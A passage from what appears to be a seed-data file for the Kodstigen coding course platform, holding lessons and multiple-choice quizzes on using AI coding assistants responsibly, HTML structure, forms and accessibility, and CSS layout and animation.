    content: lessonContent(
      'Giving AI the Right Context',
      `Even a perfectly worded prompt fails if the AI doesn't know your codebase's conventions, constraints, or history. Context often matters more than phrasing.\n\n## What counts as context\n\n- **Relevant files**, pointing at the actual code involved instead of describing it from memory.\n- **Project conventions**, naming patterns, folder structure, preferred libraries, things a new human hire would also need to learn.\n- **Error messages and logs**, the exact text, not a paraphrase, stack traces often contain the one detail that matters.\n- **Constraints**, "don't add new dependencies," "this must stay backward compatible," "keep this file under 200 lines."\n\n## Standing instructions\n\nMany AI coding tools support a persistent instructions file (Claude Code uses \`CLAUDE.md\`, for example) that's automatically included in every conversation, a good place for conventions that apply to *every* task, so you don't have to repeat them.\n\n\`\`\`\n# CLAUDE.md\n- Use Tailwind utility classes, not custom CSS files.\n- All new API routes need a matching Zod schema.\n- Run \`npm test\` before considering a change complete.\n\`\`\`\n\n## Breaking work into steps\n\nLarge, multi-part tasks ("build a whole checkout flow") produce weaker results than a sequence of smaller, well-defined ones ("add the cart total calculation," then "wire it into the checkout page," then "add validation"). Each smaller step is easier to verify, and a mistake in step one doesn't compound through steps two and three before you notice it.\n\n> [!WARNING]\n> An AI that doesn't have access to your actual codebase will still confidently guess, and often get file paths, function names, or library APIs wrong. Always give it a way to look at the real code rather than working from a description alone.`
    ),
    quiz: {
      title: 'Context Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a persistent instructions file (like CLAUDE.md) used for?',
          options: [
            'Storing passwords and secrets',
            'Conventions and constraints that should apply to every task automatically',
            'Replacing prompts entirely, so you never need to write one',
            'Documentation that the AI never actually reads',
          ],
          answer: 'Conventions and constraints that should apply to every task automatically',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Breaking a large task into a sequence of smaller, well-defined ____ produces more reliable results than one big vague request.',
          options: [],
          answer: 'steps',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Pasting the exact error message and stack trace is generally more useful than paraphrasing the error in your own words.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Reviewing AI-Generated Code',
    content: lessonContent(
      'Reviewing AI-Generated Code',
      `The fastest way for vibe coding to go wrong is treating AI output as finished, rather than as a draft that still needs your review, exactly like you'd review a pull request from a teammate.\n\n## What to check every time\n\n- **Does it actually do what you asked?** Re-read the diff against your original goal, not just "does it run."\n- **Logic errors**, off-by-one mistakes, wrong comparison operators, edge cases (empty lists, zero, null) that were never tested.\n- **Security**, this is where blind trust is most dangerous: SQL/command injection, missing input validation, secrets hardcoded into source, authentication or authorization checks that got weakened or removed.\n- **Scope creep**, did it change more than you asked for? Unrelated refactors hidden inside a "simple fix" are easy to miss if you don't read the whole diff.\n\n## Test before you trust\n\n\`\`\`\n1. Run the change locally.\n2. Exercise the exact scenario you asked for.\n3. Try at least one edge case or invalid input.\n4. Check existing tests still pass, and add a new one if the change deserves it.\n\`\`\`\n\n## You still have to understand it\n\nIf a bug shows up in production next month, you're the one debugging it, whether or not you personally typed the original code. Reading and understanding *why* an approach works, not just confirming *that* it appears to work, is what turns vibe coding into a sustainable practice instead of a liability.\n\n> [!WARNING]\n> Never let an AI assistant run destructive commands (deleting data, force-pushing, dropping database tables) without explicitly reviewing and approving that specific action first.`
    ),
    quiz: {
      title: 'Code Review Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What's the most important thing to verify in AI-generated code before shipping it?",
          options: [
            'That it compiles',
            'That it does what you asked, handles edge cases, and has no security issues',
            'That it is the shortest possible solution',
            'That it uses the newest available syntax',
          ],
          answer: 'That it does what you asked, handles edge cases, and has no security issues',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'AI-generated code should go through the same ____ process as code written by a human teammate.',
          options: [],
          answer: 'review',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'If an AI assistant writes a bug that reaches production, only the AI is responsible for it.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Vibe Coding Responsibly: Risks and Guardrails',
    content: lessonContent(
      'Vibe Coding Responsibly: Risks and Guardrails',
      `Vibe coding can make you dramatically faster, and it can also let mistakes compound quickly if you're not careful. A few guardrails keep the speed without the chaos.\n\n## Common risks\n\n- **Hallucinated APIs**, confidently using a function, library, or config option that doesn't actually exist, or doesn't work the way it assumed.\n- **Silent scope creep**, an agent "helpfully" refactoring unrelated code while completing your actual request.\n- **Security blind spots**, especially around authentication, input validation, and anything touching money or personal data.\n- **Losing understanding of your own codebase**, if every feature was written by an agent you only skimmed, you'll struggle to debug, extend, or explain any of it later.\n\n## Guardrails that help\n\n- **Commit before big changes.** A clean git history lets you review a diff properly, and revert instantly if something's wrong, rather than untangling a huge uncommitted mess.\n- **Work in small, reviewable increments.** Ask for one feature or fix at a time rather than "build the whole app," the smaller the change, the easier it is to actually verify.\n- **Ask the AI to explain its reasoning.** "Why did you choose this approach?", if the explanation doesn't make sense, that's a signal to dig deeper before accepting the change.\n- **Keep a human in the loop for anything risky.** Deleting data, sending real emails, spending real money, touching production, these should always get an explicit human review, no exceptions.\n- **Test the unhappy paths yourself.** AI-generated tests tend to cover the scenario you asked for, but you're still responsible for thinking about what could go wrong.\n\n> [!TIP]\n> A good habit: after an AI finishes a task, ask yourself "could I explain this code to a coworker right now?" If the honest answer is no, that's worth fixing before you move on, not after something breaks.`
    ),
    quiz: {
      title: 'Guardrails Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a "hallucinated API"?',
          options: [
            'A deprecated but still-working API',
            'An AI confidently using a function or library option that does not actually exist',
            'A slow API endpoint',
            'An API with unusually good documentation',
          ],
          answer: 'An AI confidently using a function or library option that does not actually exist',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Committing your code before a large AI-driven change makes it easy to ____ if something goes wrong.',
          options: [],
          answer: 'revert',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Destructive actions, like deleting data or force-pushing, should always get explicit human review before an AI executes them.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Feature Using an AI Coding Assistant',
    content: lessonContent(
      'Final Project: Build a Feature Using an AI Coding Assistant',
      `Time to put these habits into practice on a real, if small, feature.\n\n## Requirements\n\n1. Pick a small, well-scoped feature or bug fix in a project of your choice (new or existing).\n2. Use an AI coding assistant to help implement it, and write down the actual prompts you used as you go.\n3. Before accepting any AI-generated change, review the full diff yourself and note anything you changed or rejected.\n4. Test the feature manually, including at least one edge case, and add or update an automated test if the project has any.\n5. Write a short summary, a few sentences, explaining what the feature does and why your approach works, in your own words, not copied from the AI's explanation.\n\n## Stretch goals\n\n- Deliberately give the AI an underspecified prompt first, see what goes wrong, then rewrite it following this course's checklist and compare the results.\n- Set up a persistent instructions file (like a \`CLAUDE.md\`) for a project you work on regularly.\n- Find and fix one thing the AI got subtly wrong before you would have shipped it.\n\nSubmit a link to your prompts, diff, and summary (a repo, gist, or doc) below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const htmlLessons: SeedLesson[] = [
  {
    title: 'What Is HTML? Structure of a Web Page',
    content: lessonContent(
      'What Is HTML? Structure of a Web Page',
      `HTML (HyperText Markup Language) is not a programming language, it's a **markup** language: it describes the structure and meaning of content on a page, not how to compute anything. Every website you've ever visited, however fancy, has HTML underneath it.\n\n## The skeleton of every page\n\n\`\`\`html\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8" />\n    <title>My First Page</title>\n  </head>\n  <body>\n    <h1>Hello, world!</h1>\n    <p>This is my first web page.</p>\n  </body>\n</html>\n\`\`\`\n\n| Piece | Purpose |\n|---|---|\n| \`<!DOCTYPE html>\` | Tells the browser this is a modern HTML5 document. |\n| \`<html lang="en">\` | The root element; \`lang\` helps screen readers and search engines. |\n| \`<head>\` | Metadata: title, character encoding, linked stylesheets, not visible content. |\n| \`<body>\` | Everything the visitor actually sees. |\n\n## Elements, tags, and attributes\n\nAn **element** is usually written as an opening tag, some content, and a closing tag: \`<p>content</p>\`. Some elements are **void elements** and never have a closing tag or content, like \`<img>\` or \`<br>\`.\n\nAn **attribute** adds extra information to a tag, written inside the opening tag as \`name="value"\`:\n\n\`\`\`html\n<img src="cat.jpg" alt="A sleeping cat" width="300" />\n\`\`\`\n\nHere \`src\`, \`alt\`, and \`width\` are all attributes of the \`img\` element.\n\n> [!NOTE]\n> HTML elements can nest inside each other, but they must close in the reverse order they opened, \`<p><strong>bold</strong></p>\` is valid, \`<p><strong>bold</p></strong>\` is not.`
    ),
    quiz: {
      title: 'HTML Structure Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which part of an HTML document holds the visible page content?',
          options: ['<head>', '<body>', '<title>', '<meta>'],
          answer: '<body>',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Void elements like <img> never have a closing tag.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In <img src="cat.jpg" alt="A cat" />, "src" and "alt" are called ____.',
          options: [],
          answer: 'attributes',
        },
      ],
    },
  },
  {
    title: 'Text Content: Headings, Paragraphs, and Lists',
    content: lessonContent(
      'Text Content: Headings, Paragraphs, and Lists',
      `Most of a web page is text, and HTML gives you a small set of elements to describe what kind of text it is.\n\n## Headings and paragraphs\n\n\`\`\`html\n<h1>Kodstigen</h1>\n<h2>Learn to Code</h2>\n<p>Kodstigen is a platform for learning to code through interactive lessons and projects.</p>\n\`\`\`\n\nThere are six heading levels, \`<h1>\` through \`<h6>\`, from most to least important. Use exactly one \`<h1>\` per page, it's the page's main title, and don't skip levels just to make text smaller, that's what CSS is for.\n\n## Lists\n\n\`\`\`html\n<ul>\n  <li>HTML</li>\n  <li>CSS</li>\n  <li>JavaScript</li>\n</ul>\n\n<ol>\n  <li>Write the HTML</li>\n  <li>Style it with CSS</li>\n  <li>Add behavior with JavaScript</li>\n</ol>\n\`\`\`\n\n- \`<ul>\` is an **unordered list** (bullets), use it when order doesn't matter.\n- \`<ol>\` is an **ordered list** (numbers), use it when sequence matters, like steps in a recipe.\n- Every item in either list goes inside an \`<li>\` (list item).\n\n## Inline emphasis\n\n\`\`\`html\n<p>This is <strong>very important</strong> and this is <em>subtly emphasized</em>.</p>\n\`\`\`\n\n\`<strong>\` and \`<em>\` carry real semantic meaning (importance and emphasis) that screen readers announce differently, they're not just "bold" and "italic". The purely visual tags \`<b>\` and \`<i>\` still exist but should be reserved for cases with no semantic meaning at all.`
    ),
    quiz: {
      title: 'Text Content Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which list type should you use for numbered, sequential steps?',
          options: ['<ul>', '<ol>', '<li>', '<dl>'],
          answer: '<ol>',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A page should generally have more than one <h1> so search engines see multiple important topics.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Every item inside a <ul> or <ol> must be wrapped in an ____ element.',
          options: [],
          answer: 'li',
        },
      ],
    },
  },
  {
    title: 'Links, Images, and Semantic Elements',
    content: lessonContent(
      'Links, Images, and Semantic Elements',
      `## Links\n\n\`\`\`html\n<a href="https://example.com">Visit Example</a>\n<a href="/about.html">About page (relative link)</a>\n<a href="https://example.com" target="_blank" rel="noopener">Opens in a new tab</a>\n\`\`\`\n\nThe \`href\` attribute is where the link goes. Links can point to other sites (absolute URLs) or other pages on your own site (relative URLs). \`target="_blank"\` opens a new tab, and should be paired with \`rel="noopener"\` so the new page can't control the original tab.\n\n## Images\n\n\`\`\`html\n<img src="logo.png" alt="Kodstigen logo" width="120" height="120" />\n\`\`\`\n\n\`alt\` text is not optional, it's read aloud by screen readers and shown if the image fails to load. A decorative image with no informational value can use \`alt=""\`, but never omit the attribute entirely.\n\n## Semantic layout elements\n\nInstead of wrapping everything in generic \`<div>\`s, HTML5 gives you elements that describe a section's *role* on the page:\n\n| Element | Role |\n|---|---|\n| \`<header>\` | Introductory content, often a logo and navigation. |\n| \`<nav>\` | A block of navigation links. |\n| \`<main>\` | The primary content, unique to this page, one per page. |\n| \`<section>\` | A thematic grouping of content, usually with its own heading. |\n| \`<article>\` | Self-contained content that would make sense on its own (a blog post, a product card). |\n| \`<footer>\` | Closing content, like copyright or contact links. |\n\n\`\`\`html\n<header>\n  <h1>Kodstigen</h1>\n  <nav>\n    <a href="/">Home</a>\n    <a href="/courses">Courses</a>\n  </nav>\n</header>\n<main>\n  <article>\n    <h2>Why Learn to Code?</h2>\n    <p>...</p>\n  </article>\n</main>\n<footer>\n  <p>&copy; 2026 Kodstigen</p>\n</footer>\n\`\`\`\n\n> [!TIP]\n> Semantic elements look identical to a \`<div>\` by default, their real value is meaning: screen readers, browsers, and search engines all use them to understand your page's structure.`
    ),
    quiz: {
      title: 'Links & Semantics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which attribute tells the browser where a link should navigate to?',
          options: ['src', 'href', 'link', 'to'],
          answer: 'href',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The alt attribute on an <img> can safely be left out if the image is purely decorative.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The semantic element for a block of navigation links is <____>.',
          options: [],
          answer: 'nav',
        },
      ],
    },
  },
  {
    title: 'Building Forms',
    content: lessonContent(
      'Building Forms',
      `Forms are how HTML collects input from a visitor: search boxes, login screens, checkout pages.\n\n## A basic form\n\n\`\`\`html\n<form action="/submit" method="POST">\n  <label for="username">Username</label>\n  <input type="text" id="username" name="username" required />\n\n  <label for="email">Email</label>\n  <input type="email" id="email" name="email" required />\n\n  <label for="plan">Plan</label>\n  <select id="plan" name="plan">\n    <option value="free">Free</option>\n    <option value="pro">Pro</option>\n  </select>\n\n  <button type="submit">Sign Up</button>\n</form>\n\`\`\`\n\n- \`action\` is the URL the data is sent to; \`method\` is usually \`GET\` (data in the URL, for searches/filters) or \`POST\` (data in the request body, for anything that changes data).\n- Every \`<input>\` needs a matching \`<label>\`, connected by \`for\` on the label and \`id\` on the input. This isn't cosmetic, screen reader users rely on it, and it lets sighted users click the label text to focus the field.\n\n## Input types matter\n\n\`\`\`html\n<input type="text" />\n<input type="email" />\n<input type="password" />\n<input type="number" min="0" max="100" />\n<input type="checkbox" />\n<input type="radio" name="tier" value="free" />\n<input type="date" />\n\`\`\`\n\nEach \`type\` changes both the on-screen keyboard/widget shown (especially on mobile) and what the browser validates automatically, \`type="email"\` alone gives you free client-side validation for a well-formed address.\n\n> [!WARNING]\n> Client-side form validation (like \`required\` or \`type="email"\`) improves the experience, but it is never a substitute for validating input on the server. Anyone can bypass it entirely by sending a request directly.`
    ),
    quiz: {
      title: 'Forms Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How do you connect a <label> to its <input> for accessibility?',
          options: [
            'Put them next to each other in the HTML',
            'Match the label\'s "for" attribute to the input\'s "id"',
            'Wrap the input in <strong>',
            'Give both the same name attribute',
          ],
          answer: 'Match the label\'s "for" attribute to the input\'s "id"',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Client-side validation like the "required" attribute means you no longer need to validate on the server.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The form attribute that controls where submitted data is sent is ____.',
          options: [],
          answer: 'action',
        },
      ],
    },
  },
  {
    title: 'Tables and Accessibility',
    content: lessonContent(
      'Tables and Accessibility',
      `## Tables\n\nHTML tables are for **tabular data**, rows and columns of related values, not for page layout (that job belongs to CSS).\n\n\`\`\`html\n<table>\n  <thead>\n    <tr>\n      <th>Course</th>\n      <th>Lessons</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>HTML Foundations</td>\n      <td>6</td>\n    </tr>\n    <tr>\n      <td>CSS Foundations</td>\n      <td>6</td>\n    </tr>\n  </tbody>\n</table>\n\`\`\`\n\n\`<thead>\` groups the header row, \`<tbody>\` groups the data rows, and each \`<th>\` (header cell) is announced by screen readers as a column label for every \`<td>\` (data cell) beneath it.\n\n## Why accessibility matters\n\nAccessible HTML isn't an extra feature, it's what makes your site usable for people using screen readers, keyboard-only navigation, or voice control, and it usually makes the site better for everyone else too.\n\n- Use real buttons (\`<button>\`) and links (\`<a>\`) instead of \`<div onclick>\`, they come with keyboard support and screen-reader semantics for free.\n- Always give images meaningful \`alt\` text.\n- Keep a logical heading order (\`h1\` → \`h2\` → \`h3\`), don't skip levels.\n- Make sure interactive elements are reachable and usable with the Tab key alone.\n\n\`\`\`html\n<!-- Bad: no keyboard support, no semantics -->\n<div onclick="submitForm()">Submit</div>\n\n<!-- Good: works with keyboard, mouse, and screen readers -->\n<button onclick="submitForm()">Submit</button>\n\`\`\`\n\n> [!TIP]\n> A quick way to sanity-check accessibility: unplug your mouse and try to use the whole page with only Tab, Shift+Tab, and Enter. If you get stuck, so will some of your visitors.`
    ),
    quiz: {
      title: 'Tables & Accessibility Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main reason to prefer <button> over a clickable <div> for actions?',
          options: [
            'It looks better by default',
            'It comes with keyboard and screen-reader support built in',
            'It loads faster',
            'Divs cannot have click handlers',
          ],
          answer: 'It comes with keyboard and screen-reader support built in',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'HTML tables should be used for arranging general page layout, like columns of unrelated content.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The table element that groups the header row is <____>.',
          options: [],
          answer: 'thead',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Multi-Section Personal Portfolio Page',
    content: lessonContent(
      'Final Project: Build a Multi-Section Personal Portfolio Page',
      `Bring together everything from this course into a single, real page.\n\n## Requirements\n\n1. Use a full HTML5 skeleton (\`<!DOCTYPE html>\`, \`<html lang="en">\`, \`<head>\` with a \`<title>\`).\n2. Include a \`<header>\` with your name and a \`<nav>\` linking to at least three sections on the page (\`<a href="#projects">\`, etc.).\n3. Include a \`<main>\` with at least three \`<section>\`s: an "About Me", a "Projects" list using semantic \`<article>\` elements, and a "Contact" section with a working \`<form>\` (name, email, message, submit button, every input properly labeled).\n4. Use at least one \`<ul>\` or \`<ol>\`, at least one \`<img>\` with meaningful \`alt\` text, and a heading hierarchy that doesn't skip levels.\n5. Include a \`<footer>\` with a copyright line.\n\n## Stretch goals\n\n- Add a \`<table>\` summarizing your skills and proficiency levels.\n- Make every interactive element reachable and usable with only the keyboard.\n- Validate your page's HTML using the [W3C Markup Validator](https://validator.w3.org/) and fix any errors it reports.\n\nSubmit a link to your finished page (a repo, CodePen, or hosted URL) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const cssLessons: SeedLesson[] = [
  {
    title: 'What Is CSS? Selectors and the Cascade',
    content: lessonContent(
      'What Is CSS? Selectors and the Cascade',
      `CSS (Cascading Style Sheets) controls how HTML looks: colors, fonts, spacing, layout, and more. HTML says *what* something is, CSS says *how it appears*.\n\n## Three ways to add CSS\n\n\`\`\`html\n<link rel="stylesheet" href="styles.css" />\n\`\`\`\n\nAn external stylesheet, linked from \`<head>\`, is almost always the right choice: it's cacheable and keeps style separate from structure.\n\n## Selectors\n\n\`\`\`css\np { color: navy; }              /* every <p> */\n.card { padding: 16px; }        /* every element with class="card" */\n#logo { width: 120px; }         /* the one element with id="logo" */\nnav a { text-decoration: none; } /* every <a> inside a <nav> */\n\`\`\`\n\n| Selector | Matches |\n|---|---|\n| \`element\` | Every element of that tag, e.g. \`p\`, \`h1\` |\n| \`.class\` | Every element with that class attribute |\n| \`#id\` | The single element with that id |\n| \`a b\` | Every \`b\` element nested anywhere inside an \`a\` |\n\n## The cascade and specificity\n\nWhen two rules target the same element and property, CSS decides the winner using **specificity**: IDs beat classes, classes beat plain elements. If specificity ties, the rule that appears *later* in the stylesheet wins.\n\n\`\`\`css\np { color: navy; }        /* specificity: 0-0-1 */\n.highlight { color: gold; } /* specificity: 0-1-0, wins over the rule above */\n#alert { color: red; }     /* specificity: 1-0-0, wins over both */\n\`\`\`\n\n> [!WARNING]\n> \`!important\` overrides normal specificity entirely and is very hard to override again later. Treat it as a last resort, almost every specificity fight can be solved by writing a more specific (or simpler) selector instead.`
    ),
    quiz: {
      title: 'Selectors & Cascade Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Given equal specificity, which rule wins when two CSS rules conflict?',
          options: ['The shorter one', 'The one written first', 'The one written last', 'Whichever uses a class'],
          answer: 'The one written last',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An ID selector (#logo) has higher specificity than a class selector (.logo).',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A selector that targets every element with class="card" is written as ____card.',
          options: [],
          answer: '.',
        },
      ],
    },
  },
  {
    title: 'The Box Model',
    content: lessonContent(
      'The Box Model',
      `Every element on a page is rendered as a rectangular box, and every box is built from the same four layers, from the inside out.\n\n\`\`\`css\n.card {\n  width: 300px;\n  padding: 16px;      /* space between content and border */\n  border: 2px solid #333; /* the border itself */\n  margin: 24px;       /* space outside the border, between this box and others */\n}\n\`\`\`\n\n| Layer | What it does |\n|---|---|\n| Content | The actual text/images, sized by \`width\`/\`height\`. |\n| Padding | Transparent space inside the border, pushes content inward. |\n| Border | A visible (or invisible) line around the padding. |\n| Margin | Transparent space outside the border, pushes other elements away. |\n\n## box-sizing\n\nBy default, \`width\` only sets the *content* width, padding and border are added on top, so a \`300px\`-wide box with \`16px\` padding and a \`2px\` border actually takes up \`336px\`. Most developers override this globally:\n\n\`\`\`css\n*, *::before, *::after {\n  box-sizing: border-box;\n}\n\`\`\`\n\nWith \`border-box\`, \`width: 300px\` means the *whole box*, content, padding, and border, is 300px total, which is far more predictable when building layouts.\n\n## display: block vs. inline\n\n- **Block** elements (\`<div>\`, \`<p>\`, \`<h1>\`) take the full available width and stack vertically; \`width\`/\`height\`/\`margin\` all apply normally.\n- **Inline** elements (\`<span>\`, \`<a>\`) only take up as much width as their content and sit in the flow of text; vertical \`margin\`/\`height\` are ignored.\n- \`display: inline-block\` gives you the best of both, flows like text but respects \`width\`/\`height\`/\`margin\`.\n\n> [!TIP]\n> When a layout looks subtly "off" by a few pixels, the box model is the first thing to check, open devtools and look at the computed padding, border, and margin for the element in question.`
    ),
    quiz: {
      title: 'Box Model Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which box-model layer sits directly outside the border?',
          options: ['Content', 'Padding', 'Margin', 'Outline'],
          answer: 'Margin',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'With box-sizing: border-box, the width property includes padding and border.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The CSS property that adds transparent space between an element\'s content and its border is ____.',
          options: [],
          answer: 'padding',
        },
      ],
    },
  },
  {
    title: 'Flexbox: One-Dimensional Layouts',
    content: lessonContent(
      'Flexbox: One-Dimensional Layouts',
      `Flexbox arranges items along a single line, row or column, and is the workhorse for navbars, toolbars, cards, and centering content.\n\n\`\`\`css\n.nav {\n  display: flex;\n  flex-direction: row;      /* default: left to right */\n  justify-content: space-between; /* spacing along the main axis */\n  align-items: center;      /* alignment along the cross axis */\n  gap: 16px;\n}\n\`\`\`\n\n\`\`\`html\n<div class="nav">\n  <span>Logo</span>\n  <a href="/courses">Courses</a>\n  <a href="/login">Login</a>\n</div>\n\`\`\`\n\n## The two axes\n\nFlexbox thinks in terms of a **main axis** (the direction set by \`flex-direction\`) and a **cross axis** (perpendicular to it).\n\n| Property | Controls | Common values |\n|---|---|---|\n| \`justify-content\` | Spacing along the main axis | \`flex-start\`, \`center\`, \`space-between\`, \`space-around\` |\n| \`align-items\` | Alignment along the cross axis | \`flex-start\`, \`center\`, \`stretch\` |\n| \`flex-wrap\` | Whether items wrap to new lines | \`nowrap\` (default), \`wrap\` |\n| \`gap\` | Space between items | any length, e.g. \`16px\` |\n\n## Sizing individual items\n\n\`\`\`css\n.sidebar { flex: 0 0 250px; } /* never grow, never shrink, fixed 250px */\n.content { flex: 1; }         /* grow to fill remaining space */\n\`\`\`\n\n\`flex: grow shrink basis\` controls how a specific child behaves inside the flex container, \`flex: 1\` is shorthand for "take an equal share of whatever space is left".\n\n> [!TIP]\n> Centering something perfectly, both horizontally and vertically, used to be a running joke in CSS. With Flexbox it's three lines: \`display: flex; justify-content: center; align-items: center;\`.`
    ),
    quiz: {
      title: 'Flexbox Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which property controls spacing of flex items along the main axis?',
          options: ['align-items', 'justify-content', 'flex-wrap', 'gap'],
          answer: 'justify-content',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'By default, flex items will wrap onto new lines when they run out of horizontal space.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To turn any element into a flex container, you set display: ____.',
          options: [],
          answer: 'flex',
        },
      ],
    },
  },
  {
    title: 'CSS Grid: Two-Dimensional Layouts',
    content: lessonContent(
      'CSS Grid: Two-Dimensional Layouts',
      `Where Flexbox handles a single row or column, Grid handles rows *and* columns together, ideal for full page layouts and card galleries.\n\n\`\`\`css\n.page {\n  display: grid;\n  grid-template-columns: 200px 1fr;\n  grid-template-rows: auto 1fr auto;\n  gap: 16px;\n  min-height: 100vh;\n}\n\`\`\`\n\n\`\`\`html\n<div class="page">\n  <header style="grid-column: 1 / -1;">Header</header>\n  <nav>Sidebar</nav>\n  <main>Content</main>\n  <footer style="grid-column: 1 / -1;">Footer</footer>\n</div>\n\`\`\`\n\n## Defining tracks\n\n- \`grid-template-columns: 200px 1fr\` creates two columns: a fixed 200px sidebar and a flexible column that takes the rest (\`1fr\` = "one fraction of the remaining space").\n- \`repeat()\` avoids repetition: \`grid-template-columns: repeat(3, 1fr)\` creates three equal columns.\n- \`grid-column: 1 / -1\` makes an element span from the first line to the very last, a common trick for a full-width header or footer in a grid.\n\n## A responsive card gallery in one line\n\n\`\`\`css\n.gallery {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));\n  gap: 16px;\n}\n\`\`\`\n\nThis creates as many 200px-minimum columns as fit the container, and stretches them evenly to fill any leftover space, all without a single media query.\n\n> [!TIP]\n> A common rule of thumb: reach for Flexbox when you're arranging items in one direction (a toolbar, a list of tags), reach for Grid when you're arranging a whole page or a two-dimensional layout (rows *and* columns together).`
    ),
    quiz: {
      title: 'CSS Grid Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the "1fr" unit represent in a grid track definition?',
          options: [
            'Exactly 1 pixel',
            'One fraction of the remaining available space',
            'A fixed percentage of the viewport',
            'One row of text',
          ],
          answer: 'One fraction of the remaining available space',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'CSS Grid can only control columns, not rows.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The property used to turn an element into a grid container is display: ____.',
          options: [],
          answer: 'grid',
        },
      ],
    },
  },
  {
    title: 'Responsive Design, Transitions, and Animations',
    content: lessonContent(
      'Responsive Design, Transitions, and Animations',
      `## Media queries\n\nA **media query** applies CSS only when certain conditions are true, most often, viewport width, letting one stylesheet adapt to phones, tablets, and desktops.\n\n\`\`\`css\n.gallery {\n  grid-template-columns: 1fr; /* single column by default (mobile) */\n}\n\n@media (min-width: 768px) {\n  .gallery {\n    grid-template-columns: repeat(3, 1fr); /* three columns on wider screens */\n  }\n}\n\`\`\`\n\n> [!TIP]\n> Writing your base styles for mobile first, then adding \`min-width\` media queries for larger screens, tends to produce simpler CSS than starting from desktop and fighting your way down.\n\n## Transitions\n\nA **transition** smoothly animates a property change over time instead of snapping instantly.\n\n\`\`\`css\n.button {\n  background: #2563eb;\n  transition: background 0.2s ease, transform 0.2s ease;\n}\n.button:hover {\n  background: #1d4ed8;\n  transform: translateY(-2px);\n}\n\`\`\`\n\n\`transition: property duration easing\` says *which* property to animate, *how long* it takes, and *how* it accelerates.\n\n## Keyframe animations\n\nFor anything more complex than a two-state hover effect, use \`@keyframes\`:\n\n\`\`\`css\n@keyframes pulse {\n  0%   { opacity: 1; }\n  50%  { opacity: 0.4; }\n  100% { opacity: 1; }\n}\n\n.loading-dot {\n  animation: pulse 1.2s ease-in-out infinite;\n}\n\`\`\`\n\n\`@keyframes\` defines named stops along the animation as percentages, then \`animation\` on the element says which keyframes to use, how long one cycle takes, and how many times to repeat (\`infinite\` for forever).\n\n> [!WARNING]\n> Animating \`width\`, \`height\`, \`top\`, or \`left\` forces the browser to recompute layout on every frame and can look janky. Prefer animating \`transform\` and \`opacity\`, which the browser can run on the GPU without recalculating layout at all.`
    ),
    quiz: {
      title: 'Responsive & Animation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which two CSS properties are cheapest to animate because they skip layout recalculation?',
          options: ['width and height', 'top and left', 'transform and opacity', 'margin and padding'],
          answer: 'transform and opacity',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A "mobile first" approach means writing base styles for small screens, then overriding with min-width media queries for larger ones.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The CSS at-rule used to define named animation steps is @____.',
          options: [],
